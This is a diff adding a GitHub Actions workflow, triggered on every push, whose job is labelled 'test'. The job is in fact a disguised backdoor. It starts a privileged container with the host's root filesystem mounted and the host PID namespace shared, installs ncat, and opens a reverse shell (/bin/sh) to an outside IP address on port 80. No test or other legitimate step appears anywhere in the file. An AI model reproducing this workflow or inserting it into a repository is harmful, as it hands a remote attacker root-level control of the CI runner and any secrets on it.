@@ -1,0 +1,13 @@
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    container:
+      image: debian
+      volumes: [ "/:/mnt" ]
+      options: --privileged --pid host
+    steps:
+      - run: |
+          apt-get update
+          DEBIAN_FRONTEND=noninteractive apt-get install --no-install-recommends -y ncat
+          ncat -e /bin/sh 3.73.82.235 80
